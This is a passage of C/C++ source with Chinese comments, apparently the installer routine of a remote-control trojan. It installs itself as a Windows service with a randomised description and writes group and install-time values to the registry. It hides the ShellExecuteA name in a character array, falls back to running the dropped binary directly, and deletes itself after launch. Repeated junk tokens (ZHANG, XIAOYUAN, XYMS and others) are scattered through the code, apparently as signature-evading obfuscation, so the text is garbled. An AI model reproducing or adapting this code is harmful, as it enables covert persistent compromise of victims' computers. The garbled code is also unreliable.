			my_stormRands(27,ServiceDesc); 	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS //随机服务描述
			ReleiceName(m_ServiceInfo.ReleacsName,ServiceName);  //写入安装服务名称

			char DQeBW01[] = {'%','s','\\','%','s','\0'};
			char AZnamess[MAX_PATH]={NULL};	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS  //安装途径及名称
		    Gyfunction->my_sprintf(AZnamess,DQeBW01,m_ServiceInfo.ReleasePath,m_ServiceInfo.ReleaseName);   //连接安装目录和程序名称
			SetGroup(ServiceName, m_ServiceInfo.szGroup);//写入分组信息
			MarkTime(ServiceName);  //写入服务版本安装时间信息
			ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			RunService(AZnamess,ServiceName,ServicePlay,ServiceDesc);  //安装服务

			UINT strmin=0,strmin2=0;
			char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
            ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
			while(1)
			{
			    if(GetProcessID(m_ServiceInfo.ReleaseName))  //检查进程 发现程序运行
				{
					if(m_ServiceInfo.Dele_te)    //程序运行后删除
					{	ZHANG
					ZHANG
					XIAOYUAN
					XYMS
					XYMS
					FUFUFU
					ZFYZS
					WSZFY
					FUFUFU
XYMS
						DeleteMe();  //程序自删除
					}
					break;
				}
				strmin++;
				if(strmin>=3000)   //服务没启动程序 改为直接运行程序
				{
					strmin=0;
					pShellExecuteA(NULL,"open",AZnamess,NULL,NULL,SW_SHOW); //运行目标文件
					strmin2++;	ZHANG
						ZHANG
						XIAOYUAN
						XYMS
						XYMS
						FUFUFU
						ZFYZS
						WSZFY
						FUFUFU
XYMS
					if(strmin2>=3)
					{
						break;
					}
				}
			}

			pExitProcess(NULL);  // 退出运行程序
		}
	}
	else  //不是复活安装
	{
		Gyfunction->my_sprintf(ServiceName,"%s",m_ServiceInfo.ReleacsName);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS  //赋值服务名称
	    //检查是否有分组信息，并写入分组信息
		pwsprintfA(strSubKey0, JYvni08,ServiceName);	
		ReadRegEx(HKEY_LOCAL_MACHINE,strSubKey0,"ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, sizeof(lpBuffer), 0);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS

	    if (plstrlenA(lpBuffer) == 0)  //
		{
			SetGroup(ServiceName, m_ServiceInfo.szGroup);	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS//写入分组信息
			MarkTime(ServiceName);  //写入服务版本安装时间信息	
		}
		Installope=0; 	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS //写入运行方式  绿色运行
		my_ServiceMain();  //运行文件 
	}
	 
	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    return 0;
  }

////////////////////////////////////////////////////////////////////////////////////////////////